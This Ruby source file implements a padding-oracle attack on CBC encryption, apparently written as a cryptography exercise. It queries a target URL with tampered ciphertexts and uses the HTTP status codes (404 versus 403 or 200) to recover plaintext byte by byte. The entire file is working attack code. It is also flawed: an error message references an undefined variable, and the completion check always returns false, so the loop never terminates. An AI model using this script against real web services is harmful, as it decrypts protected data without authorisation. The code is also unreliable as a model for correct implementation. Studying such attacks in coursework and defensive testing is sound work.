require 'open-uri'

class PaddingOracleHacker
  attr_accessor :known

  def initialize(query_url, ciphertext)
    @ciphertext = ciphertext
    @tester = PaddingOracleTester.new(query_url)
    @known = []
  end

  def blocks
    @blocks ||= ciphertext.scan(/.{32}/)
  end

  # TODO: move to tester
  def has_a_valid_pad?(test_cipher)
    case tester.query_target(test_cipher)
    when '403', '200'
      false
    when '404'
      true
    else
      raise "tester returned bad value from site: #{status}"
    end
  end

  def discover_pad
    (1..16).each do |guess|
      if has_a_valid_pad? generate_guess(pad: 1, byte_guess: guess)
        guess.times { known.unshift guess }
        break
      end
    end
  end

  def decrypt
    discover_pad
    until plain_text_deciphered?
      pad = known.size + 1
      (32..175).each do |guess|
        test_cipher = generate_guess(pad: pad, byte_guess: guess)
        if has_a_valid_pad?(test_cipher)
          known.unshift guess
          break
        end
      end
      puts "\nknown: " + known.pack('C*') + "\n"
    end
  end

  def generate_guess(pad: 1, byte_guess: 0)
    cloned_blocks = []
    blocks.each do |block|
      cloned_blocks << block.dup
    end
    (1..pad).each do |n|
      guess = (n == pad) ? byte_guess : known[-(n)]
      index = -(2 * n)
      previous_block_hex_byte = blocks[-2][index..index+1]
      new_last_byte = (pad ^ guess ^ previous_block_hex_byte.hex)
      new_last_hex_byte = [new_last_byte].pack('C*').unpack('H*').first
      cloned_blocks[-2][index..index+1] = new_last_hex_byte
    end
    cloned_blocks.join
  end

  private
  attr_reader :ciphertext, :tester

  def plain_text_deciphered?
    false
  end
end

class PaddingOracleTester
  def initialize(base_url)
    @base_url = base_url
  end

  def query_target(ciphertext)
    response = open base_url + ciphertext
    response.status.first
  rescue OpenURI::HTTPError => error
    status_code_for error.message
  end

  private
  attr_reader :base_url

  def status_code_for(error_message)
    error_message[0..2]
  end
end
